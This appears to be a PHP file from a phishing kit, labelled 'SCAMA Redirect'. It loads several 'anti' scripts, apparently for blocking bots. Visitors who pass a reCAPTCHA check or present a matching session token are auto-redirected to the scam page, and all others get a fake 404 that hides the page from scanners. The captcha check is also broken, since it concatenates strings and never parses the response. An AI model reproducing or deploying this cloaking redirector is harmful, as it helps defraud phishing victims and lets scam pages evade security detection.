<?php
// --> #SCAMA Redirect Dont use any ather Redirect =D    ###
session_start();
require 'config.php';
require 'anti1.php';
require 'anti2.php';
require 'anti3.php';
require 'anti4.php';
require 'anti5.php';
require 'anti6.php';
require 'anti7.php';
require 'anti8.php';
if  (isset($_POST['g-recaptcha-response'])){
             $recaptcha=$_POST['g-recaptcha-response'];
$response=file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=".$captcha_secret_key."&response=".$recaptcha."&remoteip=".$_SERVER['REMOTE_ADDR']);     
if($response.success==true){
     echo "<html>
<!DOCTYPE html>
<html>
<body>
<form action='".$scamaurl."' method='get' name='redirect'></form>
<script> document.forms['redirect'].submit() </script>
</body>
</html>";
}else{
  exit(header('HTTP/1.0 404 Not Found'));	
}
}
elseif (isset($_GET['newtoken'])){
if ($_SESSION['newtoken'] == $_GET['newtoken']) {
     echo "<html>
<!DOCTYPE html>
<html>
<body>
<form action='".$scamaurl."' method='get' name='redirect'></form>
<script> document.forms['redirect'].submit() </script>
</body>
</html>";
}else{
	  exit(header('HTTP/1.0 404 Not Found'));	
}
}


?>